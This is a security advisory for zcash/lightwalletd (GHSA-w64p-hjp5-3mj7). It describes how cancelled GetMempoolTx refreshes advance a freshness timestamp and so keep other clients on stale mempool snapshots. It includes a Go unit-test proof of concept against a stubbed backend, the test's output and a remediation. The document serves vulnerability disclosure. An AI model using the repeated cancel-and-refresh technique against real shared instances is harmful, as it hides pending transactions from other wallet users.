# GHSA-w64p-hjp5-3mj7: Cancelled GetMempoolTx refreshes advance freshness timestamp and keep healthy clients on stale snapshots

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-w64p-hjp5-3mj7 |
| CVE | none assigned |
| Severity | low (CVSS 3.7) |
| CWE | n/a |
| Published | 2026-11-18T00:38:27Z |
| Updated | 2026-11-18T00:38:27Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-w64p-hjp5-3mj7 |

## Description (verbatim)

# Cancelled GetMempoolTx refreshes can keep healthy clients on a stale mempool snapshot

## Affected component

- Repository: `zcash/lightwalletd`
- Tested commit: `d16d48124e9ad4157ebc2324b5090c6ba201470c`
- Version from `git describe`: `v0.5.4-16-gd16d481`
- The relevant `frontend/service.go` code also matches tag `v0.5.4` by source comparison; the PoC was executed on the commit above.
- RPC: `CompactTxStreamer.GetMempoolTx`
- File: `frontend/service.go`

## Summary

I found that `GetMempoolTx` updates the global `lastMempool` timestamp when a refresh starts, before the refresh has succeeded or published a new snapshot.

If the client that obtained the refresh opportunity cancels its request, `RawRequest` returns the context error and no new snapshot is published. However, `lastMempool` is not restored. Healthy callers arriving during the next two seconds therefore treat the old cache as fresh, make no backend request, and receive the stale snapshot with a successful stream.

A client that can call the RPC and repeatedly wins and cancels each refresh opportunity can keep the `GetMempoolTx` view for that lightwalletd instance stale beyond the documented few-second cache interval. I verified the state behavior locally with a stubbed backend; I did not test a public deployment.

## Prerequisites and limits

- The lightwalletd instance must expose `GetMempoolTx` to wallet clients.
- The handler does not require application-level credentials or a special request body. Deployment-level network restrictions may still apply.
- The attacker must win each refresh opportunity. A missed opportunity allows another client to refresh normally.
- This does not affect consensus, confirmed blocks, private keys, or movement of funds.
- The demonstrated effect is delayed or suppressed visibility of pending compact mempool transactions on the affected lightwalletd instance.

## Root cause

In `frontend/service.go`, the freshness timestamp is advanced before any backend work:

```go
s.mutex.Lock()
refresh := time.Since(lastMempool).Seconds() >= 2
if refresh {
    lastMempool = time.Now()
}
// snapshot old cache
s.mutex.Unlock()
```

The refresh then performs `getrawmempool` and, when needed, `getrawtransaction`. Several errors and context-cancellation paths return before the new cache is published. None of those paths roll back `lastMempool`.

The security invariant should be: the cache is marked fresh only after a complete new snapshot is successfully published, or a failed refresh releases its in-flight claim immediately.

## Steps to reproduce

1. Clone the repository and check out the tested commit:

   ```bash
   git clone https://github.com/zcash/lightwalletd.git
   cd lightwalletd
   git checkout d16d48124e9ad4157ebc2324b5090c6ba201470c
   ```

2. Save the following test as `frontend/mempool_failed_lease_local_test.go`:

   ```go
   package frontend

   import (
       "bytes"
       "context"
       "encoding/hex"
       "encoding/json"
       "errors"
       "strings"
       "sync"
       "testing"
       "time"

       "github.com/zcash/lightwalletd/common"
       "github.com/zcash/lightwalletd/walletrpc"
   )

   type localMempoolRecorder struct {
       walletrpc.CompactTxStreamer_GetMempoolTxServer
       ctx context.Context
       sent []*walletrpc.CompactTx
   }

   func (r *localMempoolRecorder) Context() context.Context { return r.ctx }
   func (r *localMempoolRecorder) Send(tx *walletrpc.CompactTx) error {
       r.sent = append(r.sent, tx)
       return nil
   }

   func TestLocalCancelledRefreshCanStealRepeatedFreshnessLeases(t *testing.T) {
       testT = t
       defer resetGlobals()
       lwd, _ := testsetup()

       staleID := strings.Repeat("11", 32)
       staleHash := bytes.Repeat([]byte{0x11}, 32)
       staleTx := &walletrpc.CompactTx{
           Txid: staleHash,
           Actions: []*walletrpc.CompactOrchardAction{{Nullifier: make([]byte, 32)}},
       }
       seed := map[string]*walletrpc.CompactTx{staleID: staleTx}
       mempoolList = []string{staleID}
       mempoolMap = &seed
       lastMempool = time.Now().Add(-3 * time.Second)

       const attackCycles = 3
       started := make([]chan struct{}, attackCycles)
       for i := range started {
           started[i] = make(chan struct{})
       }
       freshID := strings.Repeat("22", 32)
       freshList, err := json.Marshal([]string{freshID})
       if err != nil { t.Fatal(err) }

       var mu sync.Mutex
       mempoolCalls := 0
       transactionCalls := 0
       common.RawRequest = func(ctx context.Context, method string, _ []json.RawMessage) (json.RawMessage, error) {
           mu.Lock()
           defer mu.Unlock()
           switch method {
           case "getrawmempool":
               call := mempoolCalls
               mempoolCalls++
               if call < attackCycles {
                   close(started[call])
                   mu.Unlock()
                   <-ctx.Done()
                   mu.Lock()
                   return nil, ctx.Err()
               }
               return freshList, nil
           case "getrawtransaction":
               transactionCalls++
               return json.Marshal(hex.EncodeToString(rawTxData[0]))
           default:
               return nil, errors.New("unexpected RPC method: " + method)
           }
       }

       req := &walletrpc.GetMempoolTxRequest{}
       var firstLease time.Time
       for cycle := 0; cycle < attackCycles; cycle++ {
           if wait := time.Until(lastMempool.Add(2*time.Second)) + 20*time.Millisecond; wait > 0 {
               time.Sleep(wait)
           }
           ctx, cancel := context.WithCancel(context.Background())
           attackerDone := make(chan error, 1)
           start := time.Now()
           go func() {
               attackerDone <- lwd.GetMempoolTx(req, &localMempoolRecorder{ctx: ctx})
           }()
           select {
           case <-started[cycle]:
           case <-time.After(time.Second):
               cancel()
               t.Fatalf("cycle %d: attacker never reached getrawmempool", cycle+1)
           }
           cancel()
           if err := <-attackerDone; err == nil {
               t.Fatalf("cycle %d: cancelled attacker unexpectedly succeeded", cycle+1)
           }
           if elapsed := time.Since(start); elapsed > 500*time.Millisecond {
               t.Fatalf("cycle %d: cancellation was not prompt: %s", cycle+1, elapsed)
           }
           if cycle == 0 { firstLease = lastMempool }

           victim := &localMempoolRecorder{ctx: context.Background()}
           if err := lwd.GetMempoolTx(req, victim); err != nil {
               t.Fatalf("cycle %d: healthy caller failed: %v", cycle+1, err)
           }
           if len(victim.sent) != 1 || !bytes.Equal(victim.sent[0].Txid, staleHash) {
               t.Fatalf("cycle %d: healthy caller did not receive stale snapshot: %+v", cycle+1, victim.sent)
           }
           mu.Lock()
           calls := mempoolCalls
           mu.Unlock()
           if calls != cycle+1 {
               t.Fatalf("cycle %d: healthy caller unexpectedly reached backend: calls=%d", cycle+1, calls)
           }
           t.Logf("cycle %d: cancelled claim advanced lastMempool; healthy caller returned stale cache with OK", cycle+1)
       }

       if held := time.Since(firstLease); held < 4*time.Second {
           t.Fatalf("expected repeated claims across multiple TTLs, observed %s", held)
       }

       lastMempool = time.Now().Add(-3 * time.Second)
       control := &localMempoolRecorder{ctx: context.Background()}
       if err := lwd.GetMempoolTx(req, control); err != nil {
           t.Fatalf("positive control refresh failed: %v", err)
       }
       mu.Lock()
       gotMempoolCalls, gotTransactionCalls := mempoolCalls, transactionCalls
       mu.Unlock()
       if gotMempoolCalls != attackCycles+1 || gotTransactionCalls != 1 {
           t.Fatalf("positive control did not perform one full refresh: mempool=%d transaction=%d", gotMempoolCalls, gotTransactionCalls)
       }
       if len(mempoolList) != 1 || mempoolList[0] != freshID {
           t.Fatalf("positive control did not publish fresh snapshot: %v", mempoolList)
       }
       t.Logf("three prompt cancellations held the victim view stale for %s; control then refreshed immediately", time.Since(firstLease))
   }
   ```

3. Run:

   ```bash
   unset GOROOT
   go test ./frontend -run '^(TestContextRawRequestCancel|TestLocalCancelledRefreshCanStealRepeatedFreshnessLeases)$' -count=1 -v
   ```

4. Observe that each cancelled refresh advances `lastMempool`, while the following healthy caller receives the seeded stale transaction with no backend refresh.

My output was:

```text
=== RUN   TestLocalCancelledRefreshCanStealRepeatedFreshnessLeases
cycle 1: cancelled claim advanced lastMempool; healthy caller returned stale cache with OK
cycle 2: cancelled claim advanced lastMempool; healthy caller returned stale cache with OK
cycle 3: cancelled claim advanced lastMempool; healthy caller returned stale cache with OK
three prompt cancellations held the victim view stale for 4.042574709s; control then refreshed immediately
--- PASS: TestLocalCancelledRefreshCanStealRepeatedFreshnessLeases (4.04s)
PASS
```

The final positive control stops cancelling and manually sets `lastMempool` to three seconds old. It then confirms that a healthy caller performs one `getrawmempool`, one `getrawtransaction`, and publishes the fresh snapshot.

The result is a freshness-state logic error rather than a Go data race.

## Observed result

After the refresh owner cancels, subsequent healthy calls during the new two-second lease return the previous cached transaction successfully and make no backend request. Repeating the cancellation extends this condition across multiple cache intervals.

## Expected result

A failed or cancelled refresh should not make the previous snapshot appear newly refreshed. Either:

- publish the new snapshot and then update its freshness timestamp; or
- track a separate in-flight refresh state and release that state immediately on failure.

## Impact

A client with access to a shared lightwalletd instance can repeatedly suppress fresh `GetMempoolTx` snapshots for other wallet clients on that instance. New pending compact transactions can remain absent and stale transactions can remain visible while healthy clients receive successful responses. The shared-client consequence follows from the global cache state and the local multi-caller test; it was not tested on a public service.

I am reporting the observed data-freshness effect and leaving severity assessment to the maintainers. I am not claiming loss of funds, consensus impact, or permanent state corruption.

## Relationship to public issues

I reviewed issues #615 and #616. Issue #615 affects the separate `GetMempoolStream` cache and marks transaction IDs seen before fetching them. Issue #616 is an in-place sorting race. This report concerns the separate `GetMempoolTx` `lastMempool` freshness timestamp and failed refresh ownership.

## Suggested remediation

Keep an explicit refresh-in-progress state separate from the last-successful-refresh timestamp. Advance the freshness timestamp only while publishing a complete snapshot under the mutex. On every error or cancellation, release the in-progress state so the next healthy caller may refresh immediately.

All testing was performed locally using synthetic transaction identifiers and a stubbed backend. No public service or third-party data was accessed.

AI assistance was used in the research and write-up. I independently ran and checked the local reproducer and the positive control.

